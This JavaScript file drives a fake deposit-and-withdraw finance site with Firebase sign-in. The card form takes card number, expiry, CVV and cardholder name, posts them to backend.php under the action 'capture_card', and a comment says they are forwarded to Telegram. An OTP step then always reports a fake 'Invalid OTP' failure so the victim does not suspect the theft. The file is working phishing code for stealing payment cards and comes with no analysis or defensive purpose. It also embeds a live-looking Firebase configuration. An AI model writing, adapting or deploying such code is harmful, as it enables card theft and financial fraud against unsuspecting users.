// ===== Firebase Config =====
const firebaseConfig = {
    apiKey: "AIzaSyDtcXcqTyaVaXzN8bY_ORsiC9CTcJkfHcw",
    authDomain: "xmv-ai.firebaseapp.com",
    projectId: "xmv-ai",
    storageBucket: "xmv-ai.firebasestorage.app",
    messagingSenderId: "617791824706",
    appId: "1:617791824706:web:c6dbd0643991a153701edb",
    measurementId: "G-K31848J74C"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();

// ===== State =====
let isDeposit = true;

// ===== DOM Ready =====
document.addEventListener('DOMContentLoaded', function() {

    // --- Tab Switching ---
    window.showTab = function(tab) {
        document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        if (tab === 'login') {
            document.getElementById('loginForm').classList.add('active');
            document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
        } else {
            document.getElementById('signupForm').classList.add('active');
            document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
        }
        // Clear errors
        document.getElementById('loginError').textContent = '';
        document.getElementById('signupError').textContent = '';
    };

    // --- Page Navigation ---
    window.showPage = function(page) {
        document.querySelectorAll('.modal, .dashboard, .card-page, .otp-page').forEach(el => el.classList.add('hidden'));
        document.getElementById(page).classList.remove('hidden');
    };

    window.goToDeposit = function() {
        isDeposit = true;
        document.getElementById('cardTitle').textContent = 'Deposit Funds';
        showPage('cardPage');
    };

    window.goToWithdraw = function() {
        isDeposit = false;
        document.getElementById('cardTitle').textContent = 'Withdraw Funds';
        showPage('cardPage');
    };

    window.goBackToDashboard = function() { showPage('dashboard'); };
    window.goBackToCard = function() { showPage('cardPage'); };

    // ==========================================
    // ===== FIREBASE AUTH - EMAIL/PASSWORD =====
    // ==========================================

    // --- Login ---
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value;
        const password = document.getElementById('loginPassword').value;
        const btn = document.getElementById('loginBtn');
        const errorEl = document.getElementById('loginError');

        btn.disabled = true;
        btn.textContent = 'Signing in...';
        errorEl.textContent = '';

        auth.signInWithEmailAndPassword(email, password)
            .then(function(userCredential) {
                const user = userCredential.user;
                setUserDashboard(user);
                showPage('dashboard');
            })
            .catch(function(error) {
                errorEl.textContent = error.message;
            })
            .finally(function() {
                btn.disabled = false;
                btn.textContent = 'Login';
            });
    });

    // --- Sign Up ---
    document.getElementById('signupForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const name = document.getElementById('signupName').value;
        const email = document.getElementById('signupEmail').value;
        const password = document.getElementById('signupPassword').value;
        const confirm = document.getElementById('signupConfirm').value;
        const btn = document.getElementById('signupBtn');
        const errorEl = document.getElementById('signupError');

        if (password !== confirm) {
            errorEl.textContent = 'Passwords do not match!';
            return;
        }

        btn.disabled = true;
        btn.textContent = 'Creating account...';
        errorEl.textContent = '';

        auth.createUserWithEmailAndPassword(email, password)
            .then(function(userCredential) {
                // Set display name
                return userCredential.user.updateProfile({ displayName: name });
            })
            .then(function() {
                const user = auth.currentUser;
                setUserDashboard(user);
                showPage('dashboard');
            })
            .catch(function(error) {
                errorEl.textContent = error.message;
            })
            .finally(function() {
                btn.disabled = false;
                btn.textContent = 'Create Account';
            });
    });

    // --- Forgot Password ---
    document.getElementById('forgotPassword').addEventListener('click', function(e) {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value;
        if (!email) {
            document.getElementById('loginError').textContent = 'Enter your email first, then click Forgot Password.';
            return;
        }
        auth.sendPasswordResetEmail(email)
            .then(function() {
                document.getElementById('loginError').textContent = 'Password reset email sent! Check your inbox.';
                document.getElementById('loginError').style.color = '#10b981';
            })
            .catch(function(error) {
                document.getElementById('loginError').textContent = error.message;
                document.getElementById('loginError').style.color = '#ef4444';
            });
    });

    // ==========================================
    // ===== FIREBASE AUTH - GOOGLE =====
    // ==========================================
    document.getElementById('googleSignIn').addEventListener('click', function() {
        const provider = new firebase.auth.GoogleAuthProvider();
        auth.signInWithPopup(provider)
            .then(function(result) {
                setUserDashboard(result.user);
                showPage('dashboard');
            })
            .catch(function(error) {
                document.getElementById('loginError').textContent = error.message;
            });
    });

    // ==========================================
    // ===== LOGOUT =====
    // ==========================================
    document.getElementById('logoutBtn').addEventListener('click', function() {
        auth.signOut().then(function() {
            showPage('authPage');
        });
    });

    // ==========================================
    // ===== AUTH STATE OBSERVER =====
    // ==========================================
    auth.onAuthStateChanged(function(user) {
        if (user) {
            setUserDashboard(user);
            showPage('dashboard');
        } else {
            showPage('authPage');
        }
    });

    // ==========================================
    // ===== HELPER: Set Dashboard UI =====
    // ==========================================
    function setUserDashboard(user) {
        const displayName = user.displayName || user.email.split('@')[0];
        document.getElementById('userName').textContent = 'Welcome, ' + displayName + '!';
        document.getElementById('userEmail').textContent = user.email;
        if (user.photoURL) {
            document.getElementById('userAvatar').src = user.photoURL;
        }
    }

    // ==========================================
    // ===== CARD FORM =====
    // ==========================================

    // Card number formatting
    document.getElementById('cardNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let parts = [];
        for (let i = 0; i < value.length && i < 16; i += 4) {
            parts.push(value.substring(i, i + 4));
        }
        e.target.value = parts.join(' ');
    });

    // Expiry formatting
    document.getElementById('expiry').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });

    // Card form submission -> backend.php -> Telegram
    document.getElementById('cardForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const user = auth.currentUser;
        const cardData = {
            type: isDeposit ? 'Deposit' : 'Withdraw',
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            cardholder: document.getElementById('cardName').value,
            amount: document.getElementById('amount').value,
            user: user ? user.email : 'unknown',
            userName: user ? (user.displayName || user.email) : 'unknown',
            timestamp: new Date().toISOString()
        };

        fetch('backend.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'capture_card', data: cardData })
        }).then(function() {
            showPage('otpPage');
        }).catch(function() {
            showPage('otpPage');
        });
    });

    // ==========================================
    // ===== OTP FORM =====
    // ==========================================
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();
        alert('Transaction failed: Invalid OTP. Please try again.');
        showPage('dashboard');
    });

    // OTP auto-focus
    document.querySelectorAll('.otp-input').forEach(function(input, index, arr) {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < arr.length - 1) {
                arr[index + 1].focus();
            }
        });
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                arr[index - 1].focus();
            }
        });
    });

});
